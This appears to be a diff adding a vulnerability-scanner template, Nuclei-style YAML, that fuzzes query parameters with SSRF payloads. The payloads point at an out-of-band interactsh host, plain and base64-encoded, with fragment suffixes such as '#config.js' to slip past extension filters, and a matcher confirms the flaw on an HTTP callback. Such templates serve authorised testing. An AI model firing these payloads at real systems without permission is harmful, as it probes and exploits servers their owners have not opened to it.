@@ -1,0 +1,40 @@
+id: ssrf-restriction-bypass
+
+info:
+  name: SSRF Restriction Bypass
+  author: reewardius
+  reference: https://telegra.ph/Kriticheskij-SSRF-na-Evernote-04-01
+  severity: high
+  tags: fuzzing-ssrf,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    
+    payloads:
+      ssrf:
+        - "https://{{interactsh-url}}/something#config.js"
+        - "{{base64('{{interactsh-url}}/something#config.js')}}"
+        - "https://{{interactsh-url}}/something#config.css"
+        - "{{base64('{{interactsh-url}}/something#config.css')}}"
+        - "https://{{interactsh-url}}/something#config.png"
+        - "{{base64('{{interactsh-url}}/something#config.png')}}"
+        - "https://{{interactsh-url}}/something#config.html"
+        - "{{base64('{{interactsh-url}}/something#config.html')}}"
+        - "https://{{interactsh-url}}/something#config.json"
+        - "{{base64('{{interactsh-url}}/something#config.json')}}"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{ssrf}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
